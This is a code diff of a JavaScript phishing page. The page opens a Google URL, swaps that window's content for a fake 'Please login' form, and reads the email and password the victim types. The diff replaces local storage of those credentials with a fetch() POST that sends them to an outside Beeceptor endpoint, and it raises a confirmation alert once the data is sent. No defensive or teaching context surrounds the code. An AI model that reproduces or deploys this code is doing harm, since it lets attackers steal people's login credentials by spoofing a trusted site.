@@ -13,7 +13,8 @@
 
     <script>
         function go() {
-            var x = window.open('https://www.google.com/csi'); // Open Google CSI
+            var x = window.open('https://www.google.com/csi'); // Open a target URL (Google)
+            
             setTimeout(function() {
                 // Change the body content of the opened window to simulate a fake login page
                 x.document.body.innerHTML = '<h1>Please login</h1>';
@@ -32,12 +33,26 @@
                         return; // Prevent sending empty data
                     }
 
-                    // Store the data in localStorage for later use on response page
-                    localStorage.setItem("email", email);
-                    localStorage.setItem("password", password);
-
-                    // You can optionally redirect to response page here if needed (this is optional)
-                    window.open('https://ecdnts-del.github.io/spoof/respon.html');
+                    // Send data to Beeceptor endpoint
+                    fetch('https://hd59ac746144df72f574.free.beeceptor.com', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            email: email,
+                            password: password
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Data successfully sent:", data);
+                        alert('Data has been sent to the server');
+                    })
+                    .catch(error => {
+                        console.error("Error sending data:", error);
+                        alert('There was an error sending the data');
+                    });
                 }
             }, 3000); // Wait for 3 seconds to simulate the page load time
         }
